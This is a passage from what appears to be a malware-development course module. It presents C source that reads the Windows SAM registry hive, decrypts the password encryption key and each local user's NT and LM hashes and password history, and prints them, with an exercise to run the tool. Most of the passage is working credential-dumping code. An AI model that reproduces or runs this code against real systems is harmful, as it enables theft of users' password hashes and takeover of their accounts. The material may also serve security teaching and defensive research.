DomainFixedData-&gt;PasswordEncryptionKey.Aes.Iv, 
DomainFixedData-&gt;PasswordEncryptionKey.Aes.Key, 
DomainFixedData-&gt;PasswordEncryptionKey.Aes.KeyLength);

			if (Result == TRUE)
			{
				RtlCopyMemory(PasswordEncryptionKey, 
DomainFixedData-&gt;PasswordEncryptionKey.Aes.Key, 16);
			}

			return Result;
		}

		default:
		{
			wprintf(L"Invalid PEK version: %lu", 
DomainFixedData-&gt;PasswordEncryptionKey.Version);
			return FALSE;
		}
	}
}
</code></pre>
<p>Now that we have the PEK, we can decrypt all hashes present on the 
system. For each user in the local domain, there is a subkey of <code>\Registry\Machine\SAM\SAM\Domains\Account\Users</code> named after the user's RID. For example, the <code>Administrator</code> account, which always has a RID of 500, corresponds to the <code>\Registry\Machine\SAM\SAM\Domains\Account\Users\000001F4</code> key.</p>
<p>Alongside the per-user subkeys, exists the <code>Names</code> subkey.
 This key contains an entry for each user in the local domain, with each
 subkey named after the corresponding user. The default value for each 
of these them is set to the user's RID. Following the scenario above, <code>\Registry\Machine\SAM\SAM\Domains\Account\Users\Names\Administrator</code> has a default value of <code>0x1F4</code>.</p>
<h3>Dumping password hashes</h3>
<p>Equipped with this information, we can form a plan to dump all the password hashes on the system:</p>
<ul>
<li>
<p>We will iterate through all subkeys of <code>\Registry\Machine\SAM\SAM\Domains\Account\Users</code> and query the <code>F</code> value. Much like the domain fixed attributes, the user <em>fixed</em> attributes contain information stored for each user in the local domain.</p>
</li>
<li>
<p>Next, we will query the <code>V</code> value, which contains the <em>Variable</em>
 user attributes. They are "variable" because, unlike the fixed 
attributes, not all of them are present for each local user. The 
variable attributes are prefixed by an <em>attribute index table</em>, describing the length of each attribute and the offset from the end of the table (the <code>Data</code>
 member of the structure) to the data itself. If an attribute is not 
present, its corresponding entry in the attribute table will have <code>Offset</code> and <code>Length</code> set to 0. For example, we can determine if the LM hash is present by checking if <code>LMHash-&gt;Length</code> is not 0.</p>
</li>
</ul>
<pre><code class="language-C">typedef struct _ATTRIBUTE_TABLE_ENTRY 
{
	ULONG Offset;
	ULONG Length;
	ULONG Reserved;
} ATTRIBUTE_TABLE_ENTRY, * PATTRIBUTE_TABLE_ENTRY;

typedef struct _SAM_USER_VARIABLE_DATA
{
	ATTRIBUTE_TABLE_ENTRY Reserved;
	ATTRIBUTE_TABLE_ENTRY UserName;
	ATTRIBUTE_TABLE_ENTRY FullName;
	ATTRIBUTE_TABLE_ENTRY Comment;
	ATTRIBUTE_TABLE_ENTRY UserComment;
	ATTRIBUTE_TABLE_ENTRY Reserved2;
	ATTRIBUTE_TABLE_ENTRY Homedir;
	ATTRIBUTE_TABLE_ENTRY HomedirConnect;
	ATTRIBUTE_TABLE_ENTRY ScriptPath;
	ATTRIBUTE_TABLE_ENTRY ProfilePath;
	ATTRIBUTE_TABLE_ENTRY Workstations;
	ATTRIBUTE_TABLE_ENTRY HoursAllowed;
	ATTRIBUTE_TABLE_ENTRY Reserved3;
	ATTRIBUTE_TABLE_ENTRY LMHash;
	ATTRIBUTE_TABLE_ENTRY NTLMHash;
	ATTRIBUTE_TABLE_ENTRY NTLMHistory;
	ATTRIBUTE_TABLE_ENTRY LMHistory;
	UCHAR                 Data[ANYSIZE_ARRAY];
} SAM_USER_VARIABLE_DATA, * PSAM_USER_VARIABLE_DATA;
</code></pre>
<ul>
<li>Lastly, we will decrypt and print the hashes described by the password related attributes, namely <code>NTLMHash</code>, <code>LMHash</code>, <code>NTLMHistory</code> and <code>LMHistory</code>.</li>
</ul>
<p>The <code>DumpPasswordHashes</code> function encapsulates the logic described above. It will use <code>PrintUserFixedData</code> and <code>PrintUserVariableData</code> to print the fixed respectively variable attributes of each user. The <code>DumpPasswordHashes</code> function has the following parameters:</p>
<ul>
<li>
<p><code>PasswordEncryptionKey</code> - A pointer to the PEK. Needed when decrypting password hashes.</p>
</li>
<li>
<p><code>OpenKeyEx</code> - A function pointer to <code>NtOpenKeyEx</code>. If it is not null, we must use it instead of <code>NtOpenKey</code>.</p>
</li>
</ul>
<pre><code class="language-C">UNICODE_STRING VariableAttributesValueName
 = RTL_CONSTANT_STRING(L"V");

VOID DumpPasswordHashes(_In_ PUCHAR PasswordEncryptionKey, _In_ 
decltype(NtOpenKeyEx)* OpenKeyEx)
{
	//
	// Open a handle to the "Users" key
	//

	HANDLE			  UsersKey;
	UNICODE_STRING    KeyName = 
RTL_CONSTANT_STRING(L"\\Registry\\Machine\\SAM\\SAM\\Domains\\Account\
\Users");
	OBJECT_ATTRIBUTES KeyAttributes;

	InitializeObjectAttributes(&amp;KeyAttributes, &amp;KeyName, 
OBJ_CASE_INSENSITIVE, 0, 0)

	NTSTATUS Status;

	if (OpenKeyEx == 0)
	{
		Status = NtOpenKey(&amp;UsersKey, KEY_ENUMERATE_SUB_KEYS, 
&amp;KeyAttributes);
	}
	else
	{
		Status = OpenKeyEx(&amp;UsersKey, KEY_ENUMERATE_SUB_KEYS, 
&amp;KeyAttributes, REG_OPTION_BACKUP_RESTORE);
	}

	if (!NT_SUCCESS(Status))
	{
		wprintf(L"Could not open a handle the Users key: 0x%08lX", Status);
		return;
	}

	//
	// Query the number of subkeys. Subtract one from this value (since we 
are not counting "Names") and you have the number of users in the local 
domain
	//

	KEY_FULL_INFORMATION KeyInformation;
	ULONG                ResultLength;

	Status = NtQueryKey(UsersKey, KeyFullInformation, &amp;KeyInformation, 
sizeof(KEY_FULL_INFORMATION), &amp;ResultLength);

	//
	// NtQueryKey may return STATUS_BUFFER_OVERFLOW because it cannot fit 
the entire key information in the buffer we specified.
	// This is fine because we the partial data we receive contains the 
number of subkeys, which is what we are looking for
	//

	if (!NT_SUCCESS(Status))
	{
		wprintf(L"Failed querying the number of \"Users\" subkeys: 0x%08lX", 
Status);
		NtClose(UsersKey);
		return;
	}

	UCHAR                  Buffer[USER_SUBKEY_INFORMATION_SIZE];
	PKEY_BASIC_INFORMATION SubkeyInformation = 
(PKEY_BASIC_INFORMATION)(Buffer);

	KeyAttributes.RootDirectory = UsersKey;

	for (ULONG Index = 0; Index &lt; KeyInformation.SubKeys - 1; Index++)
	{
		//
		// NtEnumerateKey queries information about a subkey by its index
		//

		Status = NtEnumerateKey(UsersKey, Index, KeyBasicInformation, 
SubkeyInformation, USER_SUBKEY_INFORMATION_SIZE, &amp;ResultLength);

		if (!NT_SUCCESS(Status))
		{
			wprintf(L"Could not query the subkey with index %lu: 0x%08lX", Index,
 Status);
			break;
		}

		KeyAttributes.ObjectName-&gt;Length = 
KeyAttributes.ObjectName-&gt;MaximumLength = 
SubkeyInformation-&gt;NameLength;
		KeyAttributes.ObjectName-&gt;Buffer = SubkeyInformation-&gt;Name;

		//
		// Open a handle to the subkey
		//

		HANDLE SubkeyHandle;

		if (OpenKeyEx == 0)
		{
			Status = NtOpenKey(&amp;SubkeyHandle, KEY_READ, &amp;KeyAttributes);
		}
		else
		{
			Status = OpenKeyEx(&amp;SubkeyHandle, KEY_READ, &amp;KeyAttributes, 
REG_OPTION_BACKUP_RESTORE);
		}

		if (!NT_SUCCESS(Status))
		{
			wprintf(L"Could not open a handle to the %wZ key: 0x%08lX", 
KeyAttributes.ObjectName);
			break;
		}

		//
		// Query the fixed and variable attributes of the user
		//

		UCHAR                FixedDataBuffer[100];
		PSAM_USER_FIXED_DATA UserFixedData = 
(PSAM_USER_FIXED_DATA)(((PKEY_VALUE_PARTIAL_INFORMATION)
(FixedDataBuffer))-&gt;Data);

		Status = NtQueryValueKey(SubkeyHandle, &amp;FixedAttributesValueName, 
KeyValuePartialInformation, FixedDataBuffer, 100, &amp;ResultLength);

		if (NT_SUCCESS(Status))
		{
			PKEY_VALUE_PARTIAL_INFORMATION ValueInformation;
			Status = QueryUserVariableAttributes(SubkeyHandle, 
&amp;ValueInformation);

			if (NT_SUCCESS(Status))
			{
				PSAM_USER_VARIABLE_DATA UserVariableData = 
(PSAM_USER_VARIABLE_DATA)(ValueInformation-&gt;Data);

				//
				// Print the username and RID
				//

				UNICODE_STRING UserName;
				UserName.Length = UserName.MaximumLength = 
UserVariableData-&gt;UserName.Length;
				UserName.Buffer = (PWCHAR)(UserVariableData-&gt;Data + 
UserVariableData-&gt;UserName.Offset);

				PrintUsernameAndRid(&amp;UserName, KeyAttributes.ObjectName);

				//
				// As explained in the overview of the NT hash obfuscation 
mechanism, 
				// the user's RID is the key for the DES encryption layer
				//

				ULONG UserRid = wcstoul(KeyAttributes.ObjectName-&gt;Buffer, 0, 16);

				//
				// Print the fixed attributes
				//

				PrintUserFixedData(UserFixedData);

				//
				// Print the variable attributes, including password hashes
				//

				PrintUserVariableData(UserVariableData, PasswordEncryptionKey, 
UserRid);
				HeapFree(GetProcessHeap(), 0, ValueInformation);
			}
		}

		NtClose(SubkeyHandle);
	}

	NtClose(UsersKey);
}

//
// Small wrapper around NtQueryValueKey
//
NTSTATUS QueryUserVariableAttributes(_In_ HANDLE KeyHandle, _Out_ 
PKEY_VALUE_PARTIAL_INFORMATION* ValueInformation)
{
	ULONG    ResultLength;
	NTSTATUS Status = NtQueryValueKey(KeyHandle, 
&amp;VariableAttributesValueName, KeyValuePartialInformation, 0, 0, 
&amp;ResultLength);

	if (Status != STATUS_BUFFER_TOO_SMALL)
	{
		return Status;
	}

	PKEY_VALUE_PARTIAL_INFORMATION ValueInfo = 
(PKEY_VALUE_PARTIAL_INFORMATION)(HeapAlloc(GetProcessHeap(), 
HEAP_ZERO_MEMORY, ResultLength));

	if (ValueInfo == 0)
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}

	Status = NtQueryValueKey(KeyHandle, &amp;VariableAttributesValueName, 
KeyValuePartialInformation, ValueInfo, ResultLength, &amp;ResultLength);

	if (!NT_SUCCESS(Status))
	{
		HeapFree(GetProcessHeap(), 0, ValueInfo);
		return Status;
	}

	*ValueInformation = ValueInfo;
	return Status;
}
</code></pre>
<p>As with the domain fixed attributes, we will print the user's fixed 
attributes one at a time to better understand them. This is achieved by 
the <code>PrintUserFixedData</code> function. The function has a single parameter:</p>
<ul>
<li><code>UserFixedData</code> - A pointer to a structure detailing the fixed attributes of a specific user.</li>
</ul>
<pre><code class="language-C">VOID PrintUserFixedData(_In_ 
PSAM_USER_FIXED_DATA UserFixedData)
{
	wprintf(L"- Fixed attributes: \n");


	wprintf(L" Version: %hu\n", UserFixedData-&gt;Version);

	//
	// The last time this user logged on
	//

	SYSTEMTIME Time;
	FileTimeToSystemTime((PFILETIME)(&amp;UserFixedData-&gt;LastLogon), 
&amp;Time);
	wprintf(L" LastLogon: %lu/%lu/%lu %lu:%lu:%lu\n", Time.wDay, 
Time.wMonth, Time.wYear, Time.wHour, Time.wMinute, Time.wSecond);

	//
	// The last time this user logged off
	//

	FileTimeToSystemTime((PFILETIME)(&amp;UserFixedData-&gt;LastLogoff), 
&amp;Time);
	wprintf(L" LastLogoff: %lu/%lu/%lu %lu:%lu:%lu\n", Time.wDay, 
Time.wMonth, Time.wYear, Time.wHour, Time.wMinute, Time.wSecond);

	//
	// The last time a user changed their password
	//

	
FileTimeToSystemTime((PFILETIME)(&amp;UserFixedData-
&gt;PasswordLastSet), &amp;Time);
	wprintf(L" PasswordLastSet: %lu/%lu/%lu %lu:%lu:%lu\n", Time.wDay, 
Time.wMonth, Time.wYear, Time.wHour, Time.wMinute, Time.wSecond);

	//
	// Account expiry date. If this value is 0 or 0x7FFFFFFFFFFFFFFF, the 
account has not been configured to expire
	//

	if (UserFixedData-&gt;AccountExpires.QuadPart == 0 || 
UserFixedData-&gt;AccountExpires.QuadPart == 0x7FFFFFFFFFFFFFFF)
	{
		wprintf(L" AccountExpires: Never\n");

	}
	else
	{
		
FileTimeToSystemTime((PFILETIME)(&amp;UserFixedData-&gt;AccountExpires),
 &amp;Time);
		wprintf(L" AccountExpires: %lu/%lu/%lu %lu:%lu:%lu\n", Time.wDay, 
Time.wMonth, Time.wYear, Time.wHour, Time.wMinute, Time.wSecond);
	}

	//
	// The last time the user attempted to log on using an incorrect 
password
	//

	
FileTimeToSystemTime((PFILETIME)(&amp;UserFixedData-
&gt;LastBadPasswordTime), &amp;Time);
	wprintf(L" LastBadPasswordTime: %lu/%lu/%lu %lu:%lu:%lu\n", Time.wDay, 
Time.wMonth, Time.wYear, Time.wHour, Time.wMinute, Time.wSecond);

	//
	// User's RID
	//

	wprintf(L" UserId: %lu\n", UserFixedData-&gt;UserId);

	//
	// RID of the group that this user is implicitly part of
	//

	wprintf(L" PrimaryGroupId: %lu\n", UserFixedData-&gt;PrimaryGroupId);

	//
	// Attribute that specify the password, lockout, disable/enable, 
script, and home directory behavior for the user.
	//

	wprintf(L" UserAccountControl: %lu\n", 
UserFixedData-&gt;UserAccountControl);

	//
	// Legacy localization info
	//

	wprintf(L" CountryCode: %hu\n", UserFixedData-&gt;CountryCode);
	wprintf(L" CodePage: %hu\n", UserFixedData-&gt;CodePage);

	//
	// The number of times this user has attempted to log on with an 
incorrect password.
	// Reset to 0 when the user successfully logs on
	//

	wprintf(L" BadPasswordCount: %hu\n", 
UserFixedData-&gt;BadPasswordCount);

	//
	// The amount of times this user has logged on
	//

	wprintf(L" LogonCount: %lu\n", UserFixedData-&gt;LogonCount);

	//
	// Is this account part of a privileged group?
	//

	wprintf(L" AdminCount: %lu\n", UserFixedData-&gt;AdminCount);

	//
	// Not defined in MS-ADTS
	//

	wprintf(L" OperatorCount: %lu\n\n", UserFixedData-&gt;OperatorCount);
}
</code></pre>
<p>Finally, we will use <code>PrintUserVariableData</code> to print the user variable attributes, including the password hashes and password history. Remember the <code>PasswordHistoryLength</code> member of the domain fixed attributes; if this value is non-zero, the SAM will store an array of the last <code>PasswordHistoryLength</code> password hashes in the variable attribute of user. Password related attributes are decrypted and printed using <code>DecryptHash</code> which will be explained shortly.</p>
<ul>
<li>
<p><code>UserVariableData</code> - A pointer to the <code>SAM_USER_VARIABLE_DATA</code> attribute table of a specific user.</p>
</li>
<li>
<p><code>PasswordEncryptionKey</code> - A pointer to the PEK. Used by <code>DecryptHash</code> in the decryption process.</p>
</li>
<li>
<p><code>UserRid</code> - The user's RID. Used by <code>DecryptHash</code> in the decryption process.</p>
</li>
</ul>
<pre><code class="language-C">VOID PrintUserVariableData(_In_ 
PSAM_USER_VARIABLE_DATA UserVariableData, _In_ PUCHAR 
PasswordEncryptionKey, _In_ ULONG UserRid)
{
	wprintf(L"- Variable attributes: \n");

	if (UserVariableData-&gt;FullName.Length != 0)
	{
		wprintf(L"FullName: %.*ws\n", UserVariableData-&gt;FullName.Length / 
sizeof(WCHAR), UserVariableData-&gt;Data + 
UserVariableData-&gt;FullName.Offset);
	}

	//
	// Description of the user
	//

	if (UserVariableData-&gt;Comment.Length != 0)
	{
		wprintf(L" Comment: %.*ws\n", UserVariableData-&gt;Comment.Length / 
sizeof(WCHAR), UserVariableData-&gt;Data + 
UserVariableData-&gt;Comment.Offset);
	}

	if (UserVariableData-&gt;UserComment.Length != 0)
	{
		wprintf(L" UserComment: %.*ws\n", 
UserVariableData-&gt;UserComment.Length / sizeof(WCHAR), 
UserVariableData-&gt;Data + UserVariableData-&gt;UserComment.Offset);
	}

	//
	// The home directory of the user
	//

	if (UserVariableData-&gt;Homedir.Length != 0)
	{
		wprintf(L" Homedir: %.*ws\n", UserVariableData-&gt;Homedir.Length / 
sizeof(WCHAR), UserVariableData-&gt;Data + 
UserVariableData-&gt;Homedir.Offset);
	}

	if (UserVariableData-&gt;HomedirConnect.Length != 0)
	{
		wprintf(L" HomedirConnect: %.*ws\n", 
UserVariableData-&gt;HomedirConnect.Length / sizeof(WCHAR), 
UserVariableData-&gt;Data + UserVariableData-&gt;HomedirConnect.Offset);
	}

	//
	// Specifies a path to the user's profile
	//

	if (UserVariableData-&gt;ProfilePath.Length != 0)
	{
		wprintf(L" ProfilePath: %.*ws\n", 
UserVariableData-&gt;ProfilePath.Length / sizeof(WCHAR), 
UserVariableData-&gt;Data + UserVariableData-&gt;ProfilePath.Offset);
	}

	//
	// Path for the user's logon script, if one exists 
	//

	if (UserVariableData-&gt;ScriptPath.Length != 0)
	{
		wprintf(L" ScriptPath: %.*ws\n", 
UserVariableData-&gt;ScriptPath.Length / sizeof(WCHAR), 
UserVariableData-&gt;Data + UserVariableData-&gt;ScriptPath.Offset);
	}

	//
	// NetBIOS or DNS names of the workstations from which a user is 
permitted to log on
	//

	if (UserVariableData-&gt;Workstations.Length != 0)
	{
		wprintf(L" Workstations: %.*ws\n", 
UserVariableData-&gt;Workstations.Length / sizeof(WCHAR), 
UserVariableData-&gt;Data + UserVariableData-&gt;Workstations.Offset);
	}

	//
	// Print the NT hash
	//

	if (UserVariableData-&gt;NTHash.Length != 0)
	{
		DecryptHash(NtHash, &amp;UserVariableData-&gt;NTHash, 
(PSAM_HASH)(UserVariableData-&gt;Data + 
UserVariableData-&gt;NTHash.Offset), PasswordEncryptionKey, UserRid);
	}

	//
	// Print the LM hash, if it exists
	//

	if (UserVariableData-&gt;LMHash.Length != 0)
	{
		DecryptHash(LmHash, &amp;UserVariableData-&gt;LMHash, 
(PSAM_HASH)(UserVariableData-&gt;Data + 
UserVariableData-&gt;LMHash.Offset), PasswordEncryptionKey, UserRid);
	}

	//
	// Print the NT and LM password history
	//

	if (UserVariableData-&gt;NTHistory.Length != 0)
	{
		DecryptHash(NtHistory, &amp;UserVariableData-&gt;NTHistory, 
(PSAM_HASH)(UserVariableData-&gt;Data + 
UserVariableData-&gt;NTHistory.Offset), PasswordEncryptionKey, UserRid);
	}

	if (UserVariableData-&gt;LMHistory.Length != 0)
	{
		DecryptHash(LmHistory, &amp;UserVariableData-&gt;LMHistory, 
(PSAM_HASH)(UserVariableData-&gt;Data + 
UserVariableData-&gt;LMHistory.Offset), PasswordEncryptionKey, UserRid);
	}
}
</code></pre>
<p><code>DecryptHash</code> is used to decrypt and print a hash. It takes in 5 parameters:</p>
<ul>
<li>
<p><code>HashType</code> - An enum value describing what kind of hash we want to decrypt: NT hash, LM hash, NT password history or LM password history.</p>
</li>
<li>
<p><code>HashTableEntry</code> - Pointer to the attribute index table entry corresponding to the hash which is to be decrypted. For example, <code>&amp;UserVariableData-&gt;NTHash</code></p>
</li>
<li>
<p><code>Hash</code> - Pointer to the hash data itself. This value is obtained by adding, for example, <code>UserVariableData-&gt;NTHash.Offset</code> to <code>UserVariableData-&gt;Data</code></p>
</li>
<li>
<p><code>PasswordEncryptionKey</code> - Pointer to the PEK, read and decrypted using <code>GetPasswordEncryptionKey</code>.
 It is used to remove the first layer of encryption. Depending on the 
version, this is either RC4 or AES. For AES, the PEK itself is the key, 
while for RC4, the key is a concatenation of the PEK, the user's RID, 
and a string.</p>
</li>
<li>
<p><code>UserRid</code> - The user's RID, used for DES decryption.</p>
</li>
</ul>
<pre><code class="language-C">CHAR LmPasswordString[]        = 
"LMPASSWORD";
CHAR NtPasswordString[]        = "NTPASSWORD";
CHAR LmPasswordHistoryString[] = "LMPASSWORDHISTORY";
CHAR NtPasswordHistoryString[] = "NTPASSWORDHISTORY";

VOID DecryptHash(_In_ SAM_HASH_TYPE HashType, _In_ 
PATTRIBUTE_TABLE_ENTRY HashTableEntry, _In_ PSAM_HASH Hash, _In_ PUCHAR 
PasswordEncryptionKey, _In_ ULONG UserRid)
{
	//
	// While we know the size of an NT and LM hashes is 16 bytes, there is 
no way for us to know how long the password history will be.
	// To account for this, we calculate the length of the data we want to 
decrypt by 
	// substracting size of the SAM_HASH header from the total length of 
the respective attribute (be it LMHash, NTHash etc.)
	//

	PUCHAR DataBuffer = Hash-&gt;Revision == 1 ? 
(PUCHAR)(Hash-&gt;Rc4.Data) : (PUCHAR)(Hash-&gt;Aes.Data);
	USHORT DataLength = Hash-&gt;Revision == 1 ? HashTableEntry-&gt;Length -
 FIELD_OFFSET(SAM_HASH, Rc4.Data) : HashTableEntry-&gt;Length - 
FIELD_OFFSET(SAM_HASH, Aes.Data);

	if (DataLength == 0)
	{
		return;
	}

	switch (Hash-&gt;Revision)
	{
		case 1:
		{
			MD5_CTX Md5Context;

			MD5Init(&amp;Md5Context);
			MD5Update(&amp;Md5Context, PasswordEncryptionKey, PEK_SIZE);
			MD5Update(&amp;Md5Context, &amp;UserRid, sizeof(ULONG));

			//
			// The string used in the MD5 hash depends on the type of hash
			//

			switch (HashType)
			{
				case LmHash:
				{
					MD5Update(&amp;Md5Context, LmPasswordString, 
sizeof(LmPasswordString));
					break;
				}

				case NtHash:
				{
					MD5Update(&amp;Md5Context, NtPasswordString, 
sizeof(NtPasswordString));
					break;
				}

				case LmHistory:
				{
					MD5Update(&amp;Md5Context, LmPasswordHistoryString, 
sizeof(LmPasswordHistoryString));
					break;
				}

				case NtHistory:
				{
					MD5Update(&amp;Md5Context, NtPasswordHistoryString, 
sizeof(NtPasswordHistoryString));
					break;
				}
			}

			MD5Final(&amp;Md5Context);

			STRING Data;
			Data.Length = Data.MaximumLength = DataLength;
			Data.Buffer = (PCHAR)DataBuffer;

			STRING Key;
			Key.Length = Key.MaximumLength = MD5_DIGEST_LENGTH;
			Key.Buffer = Md5Context.Digest;

			NTSTATUS Status = SystemFunction033(&amp;Data, &amp;Key);

			if (!NT_SUCCESS(Status))
			{
				return;
			}

			break;
		}

		case 2:
		{
			//
			// Peel off the AES encryption layer using the PEK
			// 

			BOOLEAN Result = Aes128Decrypt(PasswordEncryptionKey, 
Hash-&gt;Aes.Iv, DataBuffer, DataLength);

			if (Result == FALSE)
			{
				return;
			}

			break;
		}

		default:
		{
			wprintf(L"Invalid revision: %hu", Hash-&gt;Revision);
			break;
		}
	}

	//
	// Remove the final encryption layer, DES, and print the hash
	//

	switch (HashType)
	{
		case LmHash:
		case NtHash:
		{
			UCHAR    Buffer[16];
			NTSTATUS Status = SystemFunction027(DataBuffer, &amp;UserRid, 
Buffer);

			if (NT_SUCCESS(Status))
			{
				wprintf(HashType == NtHash ? L" NT hash: " : L" LM hash: ");

				for (UCHAR Index = 0; Index &lt; 16; Index++)
				{
					wprintf(L"%02X ", Buffer[Index]);
				}

				wprintf(L"\n");
			}
			else
			{
				wprintf(L"Could not DES decrypt the %ws: 0x%08lX", HashType == 
NtHash ? L"NT hash" : L"LM hash", Status);
			}

			break;
		}

		case LmHistory:
		case NtHistory:
		{
			//
			// We will decrypt and print each hash in the password history, one 
by one
			//

			UCHAR Buffer[16];

			wprintf(HashType == NtHistory ? L" NT history: " : L" LM history: ");

			for (USHORT Index = 0; Index &lt; DataLength - 16; Index += 16)
			{
				NTSTATUS Status = SystemFunction027(DataBuffer + Index, 
&amp;UserRid, Buffer);

				if (NT_SUCCESS(Status))
				{
					wprintf(L"\n	");

					for (UCHAR Index = 0; Index &lt; 16; Index++)
					{
						wprintf(L"%02X ", Buffer[Index]);
					}
				}
			}

			wprintf(L"\n");
			break;
		}
	}
}
</code></pre>
<h3>Demonstration</h3>
<p>Example output of domain fixed data:</p>
<img src="75_files/DomainOutput.png" style="margin:auto" width="1000px">
<p>Example output for a user:</p>
<img src="75_files/UserOutput.png" style="margin:auto" width="800px">

    </div>

    
        
</div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Run
 the tool and inspect the domain fixed attributes. Then, use the 
New-LocalUser PowerShell command to add a user to the local domain 
before running the tool again. What changed?</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        <div id="toc-skeleton" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2 ml-8 animate-pulse space-y-2">
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        <div class="h-4 w-2/3 bg-white/10 rounded"></div>
        <div class="h-3 w-5/6 bg-white/10 rounded"></div>
        <div class="h-3 w-4/6 bg-white/10 rounded"></div>
        <div class="h-3 w-3/6 bg-white/10 rounded"></div>
        </div>

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
        
        </div>
    </div>
    </div>

        <script>
    // If ToC starts open, build it once the DOM is ready
    document.addEventListener('DOMContentLoaded', function () {
        var el = document.getElementById('toc-content');
        if (el && !el.innerHTML.trim() && typeof extractHeadings === 'function') {
        extractHeadings();
        }
    });
    </script>
    
    <div id="maldevDB" class="hidden p-4 border-r border-b border-gray-600 font-code w-full h-full">
        <img class="w-[500px] mb-4" src="75_files/maldev-db-logo.png">
        <form id="searchForm" class="flex flex-col items-center justify-center w-full font-mono">
            <div class="relative flex w-full border border-solid border-gray-700 rounded-3xl">
            <i class="absolute fa fa-search text-gray-400 top-[14px] left-4 z-20"></i>
            <input placeholder="Search Maldev Database" type="search" name="q" autocomplete="off" id="searchInput" maxlength="85" class="relative m-0 -mr-0.5 h-[46px] w-full rounded-l-3xl  bg-transparent px-10 py-[0.25rem] font-normal leading-[1.6] text-white outline-none focus:bg-gray-800 focus:border-r focus:border-gray-700" aria-label="Search">
                <button class=" w-[70px] bg-gray-800 flex items-center justify-center rounded-r-3xl px-6 py-2.5 text-white hover:bg-gray-700" type="submit">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" fill="currentColor" class="h-5 w-5">
                    <path fill-rule="evenodd" d="M9 3.5a5.5 5.5 0 100 11 5.5 5.5 0 000-11zM2 9a7 7 0 1112.452 4.391l3.328 3.329a.75.75 0 11-1.06 1.06l-3.329-3.328A7 7 0 012 9z" clip-rule="evenodd"></path>
                    </svg>
                </button>
            </div>
            <div class="relative inline-block text-sm w-full md:w-fit">
                <select id="languageSelect" name="language" class="border rounded-md p-2.5 bg-gray-800 border-gray-600 placeholder-gray-400 text-white outline-none appearance-none w-full pr-8 my-4">
                    <option value="all" selected="selected">All languages</option>
                    <option value="c">C</option>
                    <option value="cpp">C++</option>
                    <option value="python">Python</option>
                    <option value="nim">Nim</option>
                    <option value="rust">Rust</option>
                    
                </select>
                <div class="absolute inset-y-0 right-0 flex items-center px-2 pointer-events-none">
                    <svg class="h-4 w-4 text-gray-700" fill="#fff" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20">
                        <path d="M5.516 7.548c.436-.446 1.045-.481 1.576 0L10 10.405l2.908-2.857c.531-.481 1.141-.446 1.576 0 .436.445.408 1.197 0 1.643l-3.564 3.642c-.214.223-.502.335-.92.335s-.707-.112-.92-.335l-3.564-3.642c-.408-.446-.436-1.198 0-1.643z"></path>
                    </svg>
                </div>
            </div>
        </form>
        <div class="resultsWrapper">
            <div id="noResults" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    No results found.
                </div>
            </div>
            <div id="rateLimited" class="flex flex-col justify-center items-center hidden">
                <div class="text-white text-sm opacity-50 w-full text-center font-mono mt-4">
                    HTTP 429 - You have been rate limited.
                </div>
            </div>

            <!-- Results here -->

            <div class="flex justify-center mt-6">
                <button id="loadMore" class="hidden bg-blue-700 text-white px-4 py-2 rounded hover:bg-blue-600 font-mono text-sm">
                    Load More
                </button>
            </div>
        </div>
    </div>
</div>
<div id="progress-container" class="hidden flex-col lg:min-w-[500px]">
    <div id="progress" class="p-4 border-r overflow-auto border-b border-gray-600 font-code w-full min-h-full">
    <div class="max-h-[300px]">
                <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">New Modules Progress</div>
                                    <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-1" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./1.html">
                    <div for="module-1" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 1 - Binary Metadata Modification
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-2" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./2.html">
                    <div for="module-2" class="ml-2 text-sm font-medium 
                                text-gray-900 dark:text-gray-300">
                        Module 2 - Thread Enumeration - NtQuerySystemInformation
                    </div>
                </a>
            </div>
                                <div class="flex items-center mb-2 font-sans">
                <input type="checkbox" id="module-3" class="flex-none outline-none accent-green-500 w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300" checked="checked" onclick="return false;">
                <a data-target="_self" href="./3.html">
